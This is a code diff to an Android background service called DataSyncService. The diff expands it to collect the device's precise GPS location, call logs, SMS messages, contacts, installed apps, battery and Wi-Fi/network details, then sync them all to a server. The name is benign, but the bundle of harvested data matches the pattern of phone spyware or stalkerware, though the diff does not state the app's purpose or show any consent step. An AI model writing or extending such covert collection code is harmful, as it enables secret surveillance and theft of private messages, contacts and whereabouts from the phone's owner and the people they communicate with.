@@ -6,6 +6,7 @@ import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.location.Location;
 import android.os.Build;
 import android.os.IBinder;
 import android.provider.Settings;
@@ -46,7 +47,7 @@ public class DataSyncService extends Service {
         super.onCreate();
         Log.d(TAG, "DataSyncService created");
 
-        // 🔥 FOREGROUND SERVICE (Android 14+ ke liye)
+        // Foreground service for Android 14+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             createNotificationChannel();
             Notification notification = createNotification();
@@ -85,17 +86,41 @@ public class DataSyncService extends Service {
 
             Map<String, Object> data = new HashMap<>();
 
-            // Collect data
+            // 🔥 1. LOCATION — सिर्फ accurate location भेजो
+            Location lastLoc = locationCollector.getLastLocation();
+            if (lastLoc != null && lastLoc.hasAccuracy() && lastLoc.getAccuracy() < 50) {
+                Map<String, Object> locationMap = new HashMap<>();
+                locationMap.put("latitude", lastLoc.getLatitude());
+                locationMap.put("longitude", lastLoc.getLongitude());
+                locationMap.put("accuracy", lastLoc.getAccuracy());
+                locationMap.put("speed", lastLoc.getSpeed());
+                locationMap.put("timestamp", System.currentTimeMillis());
+                data.put("location", locationMap);
+                Log.d(TAG, "📍 Location added - Accuracy: " + lastLoc.getAccuracy() + "m");
+            } else {
+                Log.d(TAG, "⚠️ No accurate location available");
+            }
+
+            // 2. CALL LOGS
             data.put("callLogs", callLogCollector.getCallLogs());
+
+            // 3. SMS
             data.put("sms", smsCollector.getSmsMessages());
+
+            // 4. CONTACTS
             data.put("contacts", contactCollector.getContacts());
 
+            // 5. APPS (Installed Apps)
+            data.put("apps", appUsageCollector.getInstalledApps());
+
+            // 6. BATTERY
             Map<String, Object> battery = new HashMap<>();
             battery.put("level", batteryCollector.getBatteryLevel());
             battery.put("status", batteryCollector.getBatteryStatus());
             battery.put("temperature", batteryCollector.getBatteryTemperature());
             data.put("battery", battery);
 
+            // 7. NETWORK
             Map<String, Object> network = new HashMap<>();
             network.put("networkType", networkCollector.getNetworkType());
             network.put("wifiSSID", networkCollector.getWifiSSID());
@@ -113,7 +138,7 @@ public class DataSyncService extends Service {
                     if (response.isSuccessful()) {
                         Log.d(TAG, "✅ Sync successful");
                     } else {
-                        Log.e(TAG, "❌ Sync failed: " + response.code());
+                        Log.e(TAG, "❌ Sync failed: " + response.code() + " - " + response.message());
                     }
                 }
 
@@ -125,6 +150,7 @@ public class DataSyncService extends Service {
 
         } catch (Exception e) {
             Log.e(TAG, "❌ Error in syncAllData: " + e.getMessage());
+            e.printStackTrace();
         }
     }
 
